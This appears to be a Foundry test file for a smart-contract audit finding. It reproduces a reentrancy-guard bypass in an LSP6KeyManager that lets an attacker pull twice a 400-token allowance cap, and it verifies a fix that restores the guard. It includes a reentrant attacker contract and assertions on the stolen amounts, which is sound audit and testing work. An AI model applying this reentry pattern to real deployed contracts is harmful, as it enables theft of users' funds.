// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Token,
    Profile,
    Integration,
    AllowanceModule,
    LSP6KeyManager,
    IReentrant
} from "./18974-trst-h-1-reentrancy-protection-can-likely-be-bypassed-trust.sol";

/// Recommended mitigation: put the pre-call status back. A permitted reentry
/// must not clear the guard for the outer execute that is still running.
contract LSP6KeyManagerFixed is LSP6KeyManager {
    constructor(address target_) LSP6KeyManager(target_) {}

    function _execute(bytes calldata payload) internal override returns (bytes memory) {
        bool entered = _reentrancyStatus;
        _nonReentrantBefore(msg.sender);
        _verifyPermissions(msg.sender, payload);
        bytes memory result = _executePayload(payload);
        _reentrancyStatus = entered;
        return result;
    }
}

contract ControlAttacker is IReentrant {
    LSP6KeyManagerFixed public km;
    Integration public integration;
    AllowanceModule public module;
    bool public didReenter;

    constructor(address _km) {
        km = LSP6KeyManagerFixed(_km);
    }

    function bind(address _integration, address _module) external {
        integration = Integration(_integration);
        module = AllowanceModule(_module);
    }

    function poke() external {
        km.execute(_pullPayload());
    }

    function reenter() external override {
        require(msg.sender == address(integration), "only integration");
        require(!didReenter, "already");
        didReenter = true;
        km.execute(_pullPayload());
    }

    function _pullPayload() internal view returns (bytes memory) {
        bytes memory inner = abi.encodeWithSelector(AllowanceModule.pull.selector, address(this), module.LIMIT());
        return abi.encodeWithSelector(
            Profile.execute.selector, uint256(0), address(module), uint256(0), inner
        );
    }
}

contract Finding18974Test is Test {
    function test_exploit_permitted_reentry_clears_guard_and_doubles_the_pull() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.token().balanceOf(address(e)), 800e18, "attacker pulled 800 TOK");
        assertEq(e.token().balanceOf(address(e.profile())), 200e18, "profile left with 200 TOK");
        assertEq(e.module().spent(address(e)), 800e18, "spent exceeds the cap");
        assertEq(e.module().LIMIT(), 400e18, "cap is 400 TOK");
        assertGt(e.module().spent(address(e)), e.module().LIMIT(), "400 TOK over the cap");
        assertTrue(e.didReenter(), "second execute ran");
        assertEq(e.integration().reentryBlocked(), 0, "vulnerable guard did not block the reentry");
    }

    function test_control_restoring_the_guard_pays_only_the_cap() public {
        Token token = new Token();
        Profile profile = new Profile(address(token));
        LSP6KeyManagerFixed km = new LSP6KeyManagerFixed(address(profile));
        profile.setKeyManager(address(km));
        ControlAttacker attacker = new ControlAttacker(address(km));
        Integration integration = new Integration(address(km), address(attacker), address(profile));
        AllowanceModule module = new AllowanceModule(address(profile), address(integration));
        integration.bind(address(module));
        attacker.bind(address(integration), address(module));
        km.bind(address(integration), address(module));
        profile.setModule(address(module));
        profile.setPermissions(address(attacker), km._PERMISSION_CALL());
        profile.setPermissions(address(integration), km._PERMISSION_REENTRANCY());
        token.mint(address(profile), 1000e18);

        attacker.poke();

        assertEq(token.balanceOf(address(attacker)), 400e18, "only the capped pull was paid");
        assertEq(token.balanceOf(address(profile)), 600e18, "the extra 400 TOK stayed");
        assertEq(module.spent(address(attacker)), 400e18, "spent equals the cap");
        assertEq(integration.reentryAttempts(), 1, "the integration did try to reenter");
        assertEq(integration.reentryBlocked(), 1, "the restored guard reverted the second execute");
        assertFalse(attacker.didReenter(), "reverted reentry did not stick");

        vm.expectRevert(bytes("over cap"));
        attacker.poke();
        assertEq(token.balanceOf(address(attacker)), 400e18, "a later pull still cannot pass the cap");
    }
}
